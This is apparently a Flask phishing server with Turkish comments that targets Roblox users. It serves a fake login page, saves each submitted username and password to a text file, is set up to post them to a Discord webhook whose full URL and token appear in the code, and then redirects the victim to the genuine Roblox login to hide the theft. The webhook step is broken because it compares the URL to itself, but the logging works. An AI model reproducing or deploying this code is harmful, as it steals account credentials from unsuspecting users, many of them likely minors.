import os
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır (Tırnak işaretlerini silme!)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"

@app.route('/')
def index():
    # Giriş sayfasını açar
    return render_template('login.html') 

@app.route('/login', methods=['POST'])
def login():
    # Formdan gelen verileri al
    user = request.form.get('username')
    pw = request.form.get('password')

    # 1. Veriyi Discord'a Gönder
    if DISCORD_WEBHOOK_URL != "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k":
        try:
            data = {
                "content": f"🚀 **Yeni Veri Geldi!**\n**Kullanıcı:** {user}\n**Şifre:** {pw}"
            }
            requests.post(DISCORD_WEBHOOK_URL, json=data)
        except Exception as e:
            print("Discord'a gönderirken hata oluştu:", e)

    # 2. Veriyi Sunucuda Bir Dosyaya Kaydet
    try:
        with open("loglar.txt", "a", encoding="utf-8") as f:
            f.write(f"User: {user} | Pass: {pw}\n")
    except Exception as e:
        print("Dosyaya yazarken hata oluştu:", e)

    # 3. Kullanıcıyı Orijinal Roblox'a Yönlendir
    return redirect("https://www.roblox.com/login")

if __name__ == "__main__":
    # Render portu otomatik atar, o yüzden portu os.environ'dan alıyoruz
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
